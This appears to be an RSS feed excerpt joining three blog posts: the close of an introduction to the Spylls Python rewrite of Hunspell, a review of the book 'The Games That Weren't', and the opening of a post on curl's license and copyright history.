<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you’ll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell’s codebase is mostly “old-school” C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already “achieved” version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be “1 million times faster” or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world’s languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I’ve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the “retelling” of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity—and years of human work that was spent growing the project—is notoriously hard to follow through the Hunspell’s codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could’ve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could’ve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what’s and why’s of the algorithms (at least for somebody not being a Hunspell’s core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few “pragmatic” ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a “port” (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I’ve tried to port Hunspell into. I’d be happy to proceed with Ruby if my goal has been just a “pragmatic” library. And yet, when I decided that my goal is to make the knowledge of Hunspell’s algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either “whole algorithm as a class” or almost-passive “structs” – or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of “list comprehensions” (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>≈1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell’s integrational tests. Those tests look like a set of files each, consisting of “test dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words”, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code—that’s why the documentation site uses custom theme with inline “Show code” feature.</p>

<hr>

<p>With this being said, I am wrapping up the introductory post.</p>

<p><strong>In the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">next series</a>: An introduction to Hunspell’s “lookup” and “suggest” concepts; and deeper dive into the lookup.</strong></p>


  </article></div>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-05-spellchecker-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789099</guid>
            <pubDate>Fri, 15 Jan 2021 10:19:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Games That Weren’t]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25788647">thread link</a>) | @rbanffy
<br/>
January 15, 2021 | https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/ | <a href="https://web.archive.org/web/*/https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1547">
	
	<div>
		
<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>



<figure><img data-attachment-id="1537" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2381/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg" data-orig-size="2863,3817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610281833&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2381" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=113 113w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>



<figure><img data-attachment-id="1538" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/scooby-doo-180901-180209/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg" data-orig-size="960,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="scooby doo-180901-180209" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=960" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg 960w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=768 768w" sizes="(max-width: 960px) 100vw, 960px"></figure>



<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>



<figure><img data-attachment-id="1539" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2341/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg" data-orig-size="2579,3439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936167&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.025&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2341" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=112 112w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>



<figure><img data-attachment-id="1540" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2343/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg" data-orig-size="3548,2661" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936217&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0090909090909091&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2343" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>



<figure><img data-attachment-id="1541" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2344/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg" data-orig-size="3817,2863" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936289&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.012658227848101&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2344" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>



<figure><img data-attachment-id="1542" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2345/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg" data-orig-size="3746,2810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936335&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.013698630136986&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2345" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>



<figure><img data-attachment-id="1543" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2346/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg" data-orig-size="3637,2728" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936363&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2346" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>



<figure><img data-attachment-id="1544" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2348/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg" data-orig-size="3729,2797" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936477&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0099009900990099&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2348" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I flick through the book to make sure I haven’t forgotten anything, I’m so tempted just to keep going here! I happened to stop on Solar Jetman, where a wonderful …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</a></em></p>]]>
            </description>
            <link>https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788647</guid>
            <pubDate>Fri, 15 Jan 2021 09:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Food on the table while giving away source code]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25788122">thread link</a>) | @nixcraft
<br/>
January 14, 2021 | https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



